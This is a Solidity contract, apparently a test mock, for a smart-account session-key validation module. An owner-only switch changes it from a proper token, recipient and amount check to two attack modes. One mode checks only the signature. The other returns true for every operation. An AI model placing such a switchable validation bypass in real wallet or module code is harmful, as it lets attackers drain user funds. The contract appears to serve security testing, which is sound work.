// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
import "./ISessionValidationModule.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract AttackSessionValidationModule is Ownable {
    uint256 public value;

    constructor() Ownable() {
        value = 0;
    }

    /**
     * @dev validates if the _op (UserOperation) matches the SessionKey permissions
     * and that _op has been signed by this SessionKey
     * @param _op User Operation to be validated.
     * @param _userOpHash Hash of the User Operation to be validated.
     * @param _sessionKeyData SessionKey data, that describes sessionKey permissions
     * @param _sessionKeySignature Signature over the the _userOpHash.
     * @return true if the _op is valid, false otherwise.
     */
    function validateSessionUserOp(
        UserOperation calldata _op,
        bytes32 _userOpHash,
        bytes calldata _sessionKeyData,
        bytes calldata _sessionKeySignature
    ) external view returns (bool) {
        if (value == 0) {
            return
                _validateSessionUserOp_valid(
                    _op,
                    _userOpHash,
                    _sessionKeyData,
                    _sessionKeySignature
                );
        } else if (value == 1) {
            return
                _validateSessionUserOp_attack_case1(
                    _op,
                    _userOpHash,
                    _sessionKeyData,
                    _sessionKeySignature
                );
        } else {
            return
                _validateSessionUserOp_attack_case2(
                    _op,
                    _userOpHash,
                    _sessionKeyData,
                    _sessionKeySignature
                );
        }
    }

    // Condition is Session should talk to defined address and should not send any value
    function _validateSessionUserOp_valid(
        UserOperation calldata _op,
        bytes32 _userOpHash,
        bytes calldata _sessionKeyData,
        bytes calldata _sessionKeySignature
    ) internal view returns (bool) {
        address sessionKey = address(bytes20(_sessionKeyData[0:20]));
        // 20:40 is token address
        address recipient = address(bytes20(_sessionKeyData[40:60]));
        uint256 maxAmount = abi.decode(_sessionKeyData[60:92], (uint256));
        {
            address token = address(bytes20(_sessionKeyData[20:40]));

            // we expect _op.callData to be `SmartAccount.executeCall(to, value, calldata)` calldata
            (address tokenAddr, uint256 callValue, ) = abi.decode(
                _op.callData[4:], // skip selector
                (address, uint256, bytes)
            );
            if (tokenAddr != token) {
                revert("ERC20SV Wrong Token");
            }
            if (callValue > 0) {
                revert("ERC20SV Non Zero Value");
            }
        }
        // working with userOp.callData
        // check if the call is to the allowed recepient and amount is not more than allowed
        bytes calldata data;
        {
            uint256 offset = uint256(bytes32(_op.callData[4 + 64:4 + 96]));
            uint256 length = uint256(
                bytes32(_op.callData[4 + offset:4 + offset + 32])
            );
            //we expect data to be the `IERC20.transfer` calldata
            data = _op.callData[4 + offset + 32:4 + offset + 32 + length];
        }
        if (address(bytes20(data[16:36])) != recipient) {
            revert("ERC20SV Wrong Recipient");
        }
        if (uint256(bytes32(data[36:68])) > maxAmount) {
            revert("ERC20SV Max Amount Exceeded");
        }

        //        address sessionKey = address(bytes20(_sessionKeyData[0:20]));
        //        address recipient = address(bytes20(_sessionKeyData[40:60]));
        //        bytes4 selector = abi.decode(_sessionKeyData[60:64], (bytes4));
        //        {
        //            address addrCalled = address(bytes20(_sessionKeyData[20:40]));
        //
        //            // we expect _op.callData to be `SmartAccount.executeCall(to, value, calldata)` calldata
        //            (address _caller, uint256 callValue, bytes memory raw_calldata ) = abi.decode(
        //                _op.callData[4:], // skip selector
        //                (address, uint256, bytes)
        //            );
        //            bytes4 callDataSelector = extractSelector(raw_calldata);
        //            if (_caller != addrCalled) {
        //                revert("Wrong validation");
        //            }
        //            if (callValue > 0) {
        //                revert("Value Non Zero");
        //            }
        //            if (callDataSelector == selector){
        //                revert("Selector mismatch");
        //            }
        //        }
        return
            ECDSA.recover(
                ECDSA.toEthSignedMessageHash(_userOpHash),
                _sessionKeySignature
            ) == sessionKey;
    }

    function _validateSessionUserOp_attack_case1(
        UserOperation calldata _op,
        bytes32 _userOpHash,
        bytes calldata _sessionKeyData,
        bytes calldata _sessionKeySignature
    ) internal view returns (bool) {
        address sessionKey = address(bytes20(_sessionKeyData[0:20]));
        return
            ECDSA.recover(
                ECDSA.toEthSignedMessageHash(_userOpHash),
                _sessionKeySignature
            ) == sessionKey;
    }

    function _validateSessionUserOp_attack_case2(
        UserOperation calldata _op,
        bytes32 _userOpHash,
        bytes calldata _sessionKeyData,
        bytes calldata _sessionKeySignature
    ) internal view returns (bool) {
        return true;
    }

    function setCase(uint256 _value) public virtual onlyOwner {
        value = _value;
    }

    function extractSelector(bytes memory data) internal pure returns (bytes4) {
        bytes4 result;
        require(data.length >= 4, "Input data must be at least 4 bytes");

        assembly {
            // Load the first 4 bytes of 'data' into 'result'
            result := mload(add(data, 32))
        }
        return result;
    }
}
